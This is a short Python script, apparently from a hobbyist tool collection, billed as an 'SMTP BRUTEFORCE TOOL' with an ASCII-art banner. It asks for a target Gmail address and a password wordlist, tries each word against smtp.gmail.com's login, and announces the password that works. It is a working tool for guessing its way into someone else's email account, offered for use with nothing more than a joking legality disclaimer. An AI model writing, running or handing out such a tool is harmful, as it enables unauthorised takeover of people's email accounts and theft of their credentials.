#code = utf8

#  GİTHUB FOR MORE TOOLS 
#  SMTP BRUTEFORCE TOOL
#  OLCAYSOFTWARE >> YOUTUBE >> İNSTAGRAM >> FACEBOOK >> TWİTTER >> DİSCORD
#  WARNİNG:!! your responsibility
#  I hope you're not doing anything illegal

import time
import ssl
import smtplib
from time import sleep
import datetime


banner = """                                                                                                                                 
        /\︵-︵/\     ╔════════════════╗
        |(◉)(◉)|      ┃ ▁▂▃▅▆▇ 100% |
        \ ︶V︶ /     ╚════════════════╝  
        /↺↺↺↺\        BY: OlcaySoftware - youtube
        ↺↺↺↺↺|        CREATOR: Yasincan olcay   
        \↺↺↺↺/        02:22 ━❍──────── 2021   
        ¯¯/\¯/\¯        
                ─────█─▄▀█──█▀▄─█─────
                ────▐▌──────────▐▌────  SMTP BRUTEFORCE────
                ────█▌▀▄──▄▄──▄▀▐█────
                ───▐██──▀▀──▀▀──██▌───
                ──▄████▄──▐▌──▄████▄──                                                         
"""
print(banner)

try:

    eposta = input("[+]>>>Target Gmail: ")
    wordlist = input("[+]>>>Wordlist File: ")
    print("___________________________________")
    print("I hope you're not doing anything illegal")
    print("\n")	
    sleep(2)


    context = ssl.create_default_context()
    port = 465
    host = "smtp.gmail.com"

    eposta_sunucu = smtplib.SMTP_SSL(port=port,host=host,context=context)
    w = "{}.txt".format(wordlist)
    file_open = open(w,"r")
    file_read = file_open.read()
    file_open.close()

    for r in file_read.splitlines():
        try:
            sifre = "{}".format(r)
    
            eposta_sunucu.login(eposta,str(sifre))
 
            succes = """
            
                    ╔═══════════════╗
                     {}                     
                    ╚═══════════════╝
                 CONNECTİNG SUCCESFULY...key found.
            """.format(r)
            print(succes)
            date = datetime.datetime.now()
            print(date)
            sleep(5)
            if r in succes:
                break


        except:
            print("[ACCESS DENİED - FAİLED!    -{}-  ]".format(r))


except:

    pass
   

